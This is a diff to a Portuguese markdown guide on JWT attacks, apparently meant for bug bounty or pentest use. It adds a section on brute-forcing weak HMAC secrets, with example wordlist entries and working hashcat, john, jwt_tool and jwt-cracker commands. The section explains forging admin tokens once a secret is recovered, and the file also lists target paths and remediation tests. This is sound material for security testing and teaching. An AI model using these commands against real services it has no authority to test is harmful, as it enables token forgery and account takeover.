@@ -97,6 +97,36 @@ Variações de bypass de WAF/filtros:
 
 Casos reais e mentalidade de ataque (RWBH): em APIs mobile e SSO de programas como Uber, Twitter e Yahoo, o padrão é testar `alg:none`, trocar RS256 por HS256 e procurar segredos fracos antes de partir para injeção de JWK/JKU.
 
+### Brute-force de segredos HMAC
+
+Tokens HS256/HS384/HS512 com segredos fracos podem ser crackeados offline. Uma wordlist dedicada (`jwt-secrets.txt`, 3503+ entradas) cobre padroes comuns:
+
+```text
+# Padroes encontrados em jwt-secrets.txt
+- Defaults: "secret", "password", "changeme", "test", "key", "jwt_secret"
+- UUIDs: "d2d2d2d2-d2d2-d2d2-d2d2-d2d2d2d2d2d2"
+- Base64: "c2VjcmV0", "dGVzdA=="
+- Nomes de servico: "my-app-secret", "api-key-production"
+- Strings aleatorias curtas: "abc123", "qwerty", "1234567890"
+```
+
+Ferramentas:
+```bash
+# hashcat (GPU, mais rapido para listas grandes)
+hashcat -a 0 -m 16500 jwt.txt jwt-secrets.txt
+
+# john the ripper
+john --wordlist=jwt-secrets.txt --format=HMAC-SHA256 jwt.txt
+
+# jwt_tool (teste automatizado de multiplos ataques)
+python3 jwt_tool.py $TOKEN -C -d jwt-secrets.txt
+
+# jwt-cracker (brute-force por caracteres, segredos curtos)
+jwt-cracker -t $TOKEN -a abcdefghijklmnopqrstuvwxyz -l 6
+```
+
+Se o segredo for recuperado, o atacante pode forjar tokens com claims arbitrarios (`role: admin`, `sub` de outro usuario, `exp` no futuro distante). Tokens HS256 com segredos de menos de 256 bits sao considerados vulneraveis.
+
 ## Target Context (Crawler Hints)
 - **Parâmetros comuns:** `Authorization: Bearer`, `token`, `jwt`, `id_token`, `access_token`, `refresh_token`, `code`.
 - **Paths comuns:** `/api/me`, `/api/v1/user`, `/oauth/token`, `/oauth/introspect`, `/.well-known/jwks.json`, `/login`, `/admin`, `/graphql`.
@@ -170,3 +200,8 @@ JwtDecoder jwtDecoder() {
 }
 ```
 9. Adicionar testes de regressão que rejeitam `alg:none`, HS256 com chave pública, `jku` externo e `kid` inválido.
+
+## Sources
+- Payload file: `jwt-secrets.txt` -- 3503+ segredos comuns para brute-force de tokens HS256/HS384/HS512
+- Bug Bounty Bootcamp (Vickie Li) -- base conceitual JWT attacks
+- PortSwigger Web Security Academy -- JWT attacks
